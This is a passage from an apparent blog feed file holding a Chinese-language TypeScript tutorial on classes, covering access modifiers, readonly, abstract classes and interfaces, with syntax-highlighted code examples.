punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">createArray</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ['x', 'x', 'x']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，此时在使用泛型接口的时候，需要定义泛型的类型。</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript类与接口</title>
      <link href="2019/07/20/tsclass/"/>
      <url>2019/07/20/tsclass/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>虽然 JavaScript 中有类的概念，但是可能大多数 JavaScript 程序员并不是非常熟悉类，这里对类相关的概念做一个简单的介绍。</p><ul><li>类(Class)：定义了一件事物的抽象特点，包含它的属性和方法</li><li>对象（Object）：类的实例，通过 <code>new</code> 生成</li><li>面向对象（OOP）的三大特性：封装、继承、多态</li><li>封装（Encapsulation）：将对数据的操作细节隐藏起来，只暴露对外的接口。外界调用端不需要（也不可能）知道细节，就能通过对外提供的接口来访问该对象，同时也保证了外界无法任意更改对象内部的数据</li><li>继承（Inheritance）：子类继承父类，子类除了拥有父类的所有特性外，还有一些更具体的特性</li><li>多态（Polymorphism）：由继承而产生了相关的不同的类，对同一个方法可以有不同的响应。比如 <code>Cat</code> 和 <code>Dog</code> 都继承自 <code>Animal</code>，但是分别实现了自己的 <code>eat</code> 方法。此时针对某一个实例，我们无需了解它是 <code>Cat</code> 还是 <code>Dog</code>，就可以直接调用 <code>eat</code> 方法，程序会自动判断出来应该如何执行 <code>eat</code></li><li>存取器（getter &amp; setter）：用以改变属性的读取和赋值行为</li><li>修饰符（Modifiers）：修饰符是一些关键字，用于限定成员或类型的性质。比如 <code>public</code> 表示公有属性或方法</li><li>抽象类（Abstract Class）：抽象类是供其他类继承的基类，抽象类不允许被实例化。抽象类中的抽象方法必须在子类中被实现</li><li>接口（Interfaces）：不同类之间公有的属性或方法，可以抽象成一个接口。接口可以被类实现（implements）。一个类只能继承自另一个类，但是可以实现多个接口</li></ul><h2 id="ES6中类的用法"><a href="#ES6中类的用法" class="headerlink" title="ES6中类的用法"></a>ES6中类的用法</h2><h3 id="属性和方法"><a href="#属性和方法" class="headerlink" title="属性和方法"></a>属性和方法</h3><p>使用 <code>class</code> 定义类，使用 <code>constructor</code> 定义构造函数。</p><p>通过 <code>new</code> 生成新实例的时候，会自动调用构造函数。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`My name is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// My name is Jack</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>使用 <code>extends</code> 关键字实现继承，子类中使用 <code>super</code> 关键字来调用父类的构造函数和方法。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用父类的 constructor(name)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'Meow, '</span> <span class="token operator">+</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用父类的 sayHi()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token string">'Tom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Tom</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Meow, My name is Tom</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>使用 <code>static</code> 修饰符修饰的方法称为静态方法，它们不需要实例化，而是直接通过类来调用：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token function">isAnimal</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> a <span class="token keyword">instanceof</span> <span class="token class-name">Animal</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Animal<span class="token punctuation">.</span><span class="token function">isAnimal</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>a<span class="token punctuation">.</span><span class="token function">isAnimal</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// TypeError: a.isAnimal is not a function</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ES7中类的用法"><a href="#ES7中类的用法" class="headerlink" title="ES7中类的用法"></a>ES7中类的用法</h2><h3 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h3><p>ES6 中实例的属性只能通过构造函数中的 <code>this.xxx</code> 来定义，ES7 提案中可以直接在类里面定义：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    name <span class="token operator">=</span> <span class="token string">'Jack'</span><span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Jack</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h3><p>ES7 提案中，可以使用 <code>static</code> 定义一个静态属性：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> num <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Animal<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 42</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TypeScript中类的用法"><a href="#TypeScript中类的用法" class="headerlink" title="TypeScript中类的用法"></a>TypeScript中类的用法</h2><p>TypeScript 可以使用三种访问修饰符（Access Modifiers），分别是 <code>public</code>、<code>private</code> 和 <code>protected</code>。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><p><code>public</code> 修饰的属性或方法是公有的，可以在任何地方被访问到，默认所有的属性和方法都是 <code>public</code> 的</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Jack</span>a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Tom'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Tom</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的例子中，<code>name</code> 被设置为了 <code>public</code>，所以直接访问实例的 <code>name</code> 属性是允许的。</p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p><code>private</code> 修饰的属性或方法是私有的，不能在声明它的类的外部访问。</p><p>很多时候，我们希望有的属性是无法直接存取的，这时候就可以用 <code>private</code> 了：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Jack</span>a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Tom'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// index.ts(9,13): error TS2341: Property 'name' is private and only accessible within class 'Animal'.</span><span class="token comment" spellcheck="true">// index.ts(10,1): error TS2341: Property 'name' is private and only accessible within class 'Animal'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是，TypeScript 编译之后的代码中，并没有限制 <code>private</code> 属性在外部的可访问性。</p><p>上面的例子编译后的代码是：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> Animal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">Animal</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Animal<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Tom'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>private</code> 修饰的属性或方法，在子类中也是不允许访问的：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// index.ts(11,17): error TS2341: Property 'name' is private and only access</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><p><code>protected</code> 修饰的属性或方法是受保护的，它和 <code>private</code> 类似，区别是它在子类中也是允许被访问的</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h3><p>你可以使用<code>readonly</code>关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    readonly name<span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> cat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Tom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cat<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'jack'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Cannot assign to 'name' because it is a read-only property.ts(2540)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>抽象类是供其它类继承的基类。 他们一般不会直接被实例化。 不同于接口，抽象类可以包含成员的实现细节。 <code>abstract</code>关键字是用于定义抽象类和在抽象类内部定义抽象方法。</p><pre class="line-numbers language-js"><code class="language-js">abstract <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    abstract <span class="token function">makeSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'roaming the earch...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似。 两者都是定义方法签名不包含方法体。 然而，抽象方法必须使用<code>abstract</code>关键字并且可以包含访问符。</p><pre class="line-numbers language-ts"><code class="language-ts">abstract <span class="token keyword">class</span> <span class="token class-name">Department</span> <span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token keyword">public</span> name<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Department name: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    abstract <span class="token function">printMeeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 必须在派生类中实现</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">AccountingDepartment</span> <span class="token keyword">extends</span> <span class="token class-name">Department</span> <span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">'Accounting and Auditing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// constructors in derived classes must call super()</span>    <span class="token punctuation">}</span>    <span class="token function">printMeeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The Accounting Department meets each Monday at 10am.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">generateReports</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Generating accounting reports...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> department<span class="token punctuation">:</span> Department<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ok to create a reference to an abstract type</span>department <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// error: cannot create an instance of an abstract class</span>department <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccountingDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ok to create and assign a non-abstract subclass</span>department<span class="token punctuation">.</span><span class="token function">printName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>department<span class="token punctuation">.</span><span class="token function">printMeeting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>department<span class="token punctuation">.</span><span class="token function">generateReports</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// error: method doesn't exist on declared abstract type</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="类的类型"><a href="#类的类型" class="headerlink" title="类的类型"></a>类的类型</h2><p>给类加上 TypeScript 的类型很简单，与接口类似：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`My name is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> a<span class="token punctuation">:</span> Animal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// My name is Jack</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="类实现接口"><a href="#类实现接口" class="headerlink" title="类实现接口"></a>类实现接口</h2><p>实现（implements）是面向对象中的一个重要概念。一般来讲，一个类只能继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 <code>implements</code> 关键字来实现。这个特性大大提高了面向对象的灵活性。</p><p>举例来说，门是一个类，防盗门是门的子类。如果防盗门有一个报警器的功能，我们可以简单的给防盗门添加一个报警方法。这时候如果有另一个类，车，也有报警器的功能，就可以考虑把报警器提取出来，作为一个接口，防盗门和车都去实现它：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Door</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">SecurityDoor</span> <span class="token keyword">extends</span> <span class="token class-name">Door</span> <span class="token keyword">implements</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'SecurityDoor alert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token keyword">implements</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Car alert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个类可以实现多个接口：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">Light</span> <span class="token punctuation">{</span>    <span class="token function">lightOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lightOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token keyword">implements</span> <span class="token class-name">Alarm</span><span class="token punctuation">,</span> Light <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Car alert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">lightOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Car light on'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">lightOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Car light off'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 